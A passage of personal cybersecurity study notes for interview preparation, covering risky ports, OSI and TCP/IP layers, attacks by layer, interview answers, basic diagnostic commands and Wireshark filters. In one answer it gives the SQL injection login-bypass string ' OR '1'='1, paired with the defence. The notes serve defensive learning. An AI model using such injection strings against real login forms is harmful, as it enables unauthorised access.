| 20/21 | FTP | ❌ NO | Passwords visible on network | Replace with SFTP (port 22) |
| 22 | SSH/SFTP | ✅ YES | Brute-force target | Disable password auth, use keys |
| 23 | Telnet | ❌ NO | Everything in plain text | NEVER use. Disable immediately. |
| 25 | SMTP | ⚠️ Optional | Phishing infrastructure | Check SPF/DKIM/DMARC records |
| 53 | DNS | ⚠️ Optional | Tunnelling, poisoning, DGA | Monitor for anomalous queries |
| 80 | HTTP | ❌ NO | All traffic visible | Redirect to HTTPS |
| 110 | POP3 | ❌ NO | Email in clear text | Use POP3S (995) instead |
| 143 | IMAP | ❌ NO | Email in clear text | Use IMAPS (993) instead |
| 443 | HTTPS | ✅ YES | Malware also uses 443 to blend in | Inspect TLS traffic at firewall |
| 445 | SMB | ✅ YES | EternalBlue/WannaCry | Keep patched, block at perimeter |
| 3306 | MySQL | ⚠️ Optional | Direct database access | NEVER expose to internet |
| 3389 | RDP | ✅ YES | Biggest brute-force target | Require VPN + MFA |

---

# 🎯 PART 5 — OSI vs TCP/IP COMPARISON

## Side by Side

| OSI Model | TCP/IP Model |
|-----------|-------------|
| 7 layers | 4 layers |
| Theoretical model (for teaching) | Practical model (actually used) |
| Created by ISO in 1984 | Created by DARPA in 1970s |
| Great for troubleshooting ("which layer?") | Great for understanding actual internet |
| Not directly implemented | What every device on internet runs |

## When Do You Use Each?

**Use OSI when:** An interviewer asks "what layer does X attack happen at?" or "what layer does Y device operate at?"

**Use TCP/IP when:** You're actually working with network protocols, configuring systems, or understanding how the internet works.

---

# 🧠 PART 6 — SUMMARY CHEAT SHEET

## OSI Layers — One Line Each

```
Layer 7 — Application:   Where you interact (Chrome, WhatsApp, SSH)
Layer 6 — Presentation:  Encryption (TLS), Compression (GZIP), Format (JPEG)
Layer 5 — Session:        Login sessions, session cookies, connection management
Layer 4 — Transport:      TCP (reliable) vs UDP (fast), Port numbers
Layer 3 — Network:        IP addresses, Routing, Routers
Layer 2 — Data Link:      MAC addresses, Switches, ARP, Frames
Layer 1 — Physical:       Cables, Wi-Fi signals, Hubs, Bits
```

## Attacks by Layer — The SOC Analyst's Map

```
Layer 1 → Physical wiretapping, rogue access points
Layer 2 → ARP poisoning, MAC flooding, VLAN hopping
Layer 3 → IP spoofing, ICMP flood, route hijacking
Layer 4 → SYN flood, port scanning, session hijacking
Layer 5 → Session hijacking, cookie theft
Layer 6 → SSL stripping, CRIME attack, malicious files
Layer 7 → SQLi, XSS, CSRF, phishing, DNS poisoning, HTTP flood
```

## Devices by Layer

```
Layer 1 → Hub, Repeater, Network cables
Layer 2 → Switch, Bridge, Wireless Access Point
Layer 3 → Router, Layer 3 Switch
Layer 4 → Stateful Firewall (tracks TCP connections)
Layer 7 → Load Balancer, WAF (Web Application Firewall), Proxy
```

## TCP vs UDP — 10-Second Summary

```
TCP:  Reliable + Slow + Ordered + Handshake required
      Use for: web (HTTP/S), SSH, FTP, email, databases

UDP:  Fast + Unreliable + No handshake
      Use for: DNS, video streaming, VoIP, gaming
```

---

# ❓ PART 7 — INTERVIEW QUESTIONS WITH SIMPLE ANSWERS

These are the actual questions companies ask. Read each answer out loud — say it like you'd explain it to a friend.

---

**Q1: What is the OSI model and why does it exist?**

> "The OSI model breaks down network communication into 7 steps, each with a specific job. It exists so that equipment from different companies can communicate — like a universal rulebook. It also helps us troubleshoot problems by pinpointing exactly which step something went wrong in."

---

**Q2: What layer does a switch work at? What about a router?**

> "A switch works at Layer 2, the Data Link layer. It uses MAC addresses to deliver frames within the same local network. A router works at Layer 3, the Network layer. It uses IP addresses to route packets between different networks. Simple way to remember: Switch = MAC = Layer 2, Router = IP = Layer 3."

---

**Q3: Explain the TCP 3-way handshake.**

> "It's how TCP sets up a connection before sending any data. Client sends SYN saying 'I want to connect'. Server replies with SYN-ACK saying 'OK, I heard you, can you hear me?' Client sends final ACK saying 'Yes! Let's go.' After this, data flows. It's like confirming a phone call is connected before starting the conversation."

---

**Q4: What is ARP? What is ARP poisoning?**

> "ARP resolves IP addresses to MAC addresses on a local network. When your computer knows an IP but needs the MAC to send a frame, it broadcasts an ARP request asking 'Who has this IP?' The owner replies with their MAC. ARP poisoning is when an attacker sends fake ARP replies, tricking devices into updating their ARP cache with wrong information. Now traffic meant for your router goes to the attacker instead — a man-in-the-middle attack."

---

**Q5: What is the difference between TCP and UDP?**

> "TCP is reliable — it does a 3-way handshake, guarantees delivery, ensures data arrives in order, and retransmits lost packets. It's slower because of this overhead. UDP is fast — no handshake, no guarantees, just sends data and hopes it arrives. Use TCP when every byte must arrive correctly (web, email, file transfer). Use UDP when speed matters more than perfection (video calls, gaming, DNS)."

---

**Q6: What happens when you type google.com in your browser?**

> "First, DNS resolves 'google.com' to an IP address. Then a TCP 3-way handshake is performed with Google's server on port 443. TLS handshake follows for encryption. Then the HTTP GET request is sent, Google responds with HTML. All of this travels down through the layers — Application creates the request, Transport adds TCP headers and port numbers, Network adds IP addresses, Data Link adds MAC addresses, Physical transmits the bits. At Google's end, the process reverses up the stack."

---

**Q7: What is a SYN flood and how does it work?**

> "A SYN flood is a Layer 4 DoS attack. The attacker sends thousands of SYN packets — the first step of the TCP handshake — but never sends the final ACK. The server allocates resources for each half-open connection and waits. Eventually the server's connection table fills up and legitimate users can't connect. Defence: SYN cookies, which make the server not allocate resources until the final ACK arrives."

---

**Q8: What is DNS and what security attacks target it?**

> "DNS translates domain names to IP addresses — it's the internet's phone book. Key attacks: DNS cache poisoning (attacker injects false records so users get sent to wrong servers), DNS tunnelling (attacker hides data exfiltration inside DNS queries — hard to detect because DNS traffic is often allowed), DNS amplification DDoS (attacker sends small DNS queries with spoofed source IP, DNS responds with large answers to the victim — amplifying the attack)."

---

**Q9: What is SQL injection?**

> "SQL injection is when an attacker inserts malicious SQL code into user input fields to manipulate the database. For example, entering `' OR '1'='1` in a login field can bypass authentication because the SQL query becomes always-true. Defence: use parameterised queries so user input is never treated as SQL code."

---

**Q10: What layer does a firewall operate at?**

> "Depends on the type. Packet filtering firewalls work at Layers 3 and 4 — they filter by IP addresses and ports. Stateful firewalls work at Layer 4 — they track the state of TCP connections. Next-Generation Firewalls (NGFW) work at Layer 7 — they can inspect application-level content, identify applications, and detect threats in encrypted traffic."

---

# 🔬 PART 8 — HANDS-ON PRACTICE

## Try These Right Now on Your Computer

### 1. See ARP in action
Open terminal and type:
```bash
arp -a
```
You'll see your device's ARP cache — IP to MAC mappings it has learned. Notice your router's entry!

### 2. Test DNS resolution
```bash
nslookup google.com
nslookup facebook.com
nslookup tryhackme.com
```
Watch the DNS server resolve each domain to an IP instantly.

### 3. Trace the route to Google (Layer 3 routing in action!)
```bash
tracert google.com     (Windows)
traceroute google.com  (Linux/Mac)
```
Each line is a **router hop** — you're watching your packet travel from your home to Google's server, one router at a time!

### 4. See all open ports on your machine
```bash
netstat -an    (Windows/Linux/Mac)
```
You'll see all listening ports, established connections, and their state (LISTEN, ESTABLISHED, TIME_WAIT).

### 5. Test your loopback (Layer 3)
```bash
ping 127.0.0.1
```
If you get replies, your device's TCP/IP stack is working correctly.

## Wireshark Filters to Practise

Once you open Wireshark and capture traffic, use these filters:

| Filter | What You'll See |
|--------|----------------|
| `tcp.flags.syn==1 && tcp.flags.ack==0` | Only the first SYN packet — every new TCP connection |
| `dns` | All DNS queries and responses |
| `arp` | All ARP requests and replies |
| `http` | All clear-text HTTP traffic |
| `tcp.port==443` | All HTTPS traffic (you can't read the content, but you can see the connections) |
| `icmp` | Ping packets |

---

# 📌 FINAL PAGE — STICK THIS ON YOUR WALL

```
╔══════════════════════════════════════════════════════════╗
║            AKSHAT'S OSI QUICK REFERENCE                  ║
╠══════════════════════════════════════════════════════════╣
║  7 - APPLICATION  → HTTP, HTTPS, DNS, FTP, SSH, SMTP    ║
║  6 - PRESENTATION → SSL/TLS, JPEG, GZIP, encryption     ║
║  5 - SESSION      → Sessions, cookies, login state       ║
║  4 - TRANSPORT    → TCP (reliable) / UDP (fast), ports   ║
║  3 - NETWORK      → IP addresses, routing, routers       ║
║  2 - DATA LINK    → MAC addresses, switches, ARP         ║
║  1 - PHYSICAL     → Cables, Wi-Fi, hubs, bits            ║
╠══════════════════════════════════════════════════════════╣
║  MNEMONIC ↑: Please Do Not Throw Sausage Pizza Away     ║
║  MNEMONIC ↓: All People Seem To Need Data Processing    ║
╠══════════════════════════════════════════════════════════╣
║  MUST-KNOW PORTS                                         ║
║  22=SSH  23=Telnet(evil!)  25=SMTP  53=DNS  80=HTTP     ║
║  443=HTTPS  445=SMB  3306=MySQL  3389=RDP(danger!)      ║
╠══════════════════════════════════════════════════════════╣
║  TCP = Reliable + Slow + Handshake (SYN→SYN-ACK→ACK)   ║
║  UDP = Fast + No guarantee + No handshake               ║
╠══════════════════════════════════════════════════════════╣
║  ATTACK MAP                                              ║
║  Layer 2 → ARP Poisoning                                 ║
║  Layer 3 → IP Spoofing, ICMP Flood                      ║
║  Layer 4 → SYN Flood, Port Scan                         ║
║  Layer 7 → SQLi, XSS, Phishing, DNS Poisoning          ║
╚══════════════════════════════════════════════════════════╝
```

---

> **Next step:** Open TryHackMe → Complete "Packets & Frames" room → Then open Wireshark and capture real traffic. You will recognise EVERYTHING from these notes in real packets. That's when it clicks. 💪
>
> **Day 1 ✅ — 59 days to go. Keep going, Akshat!**

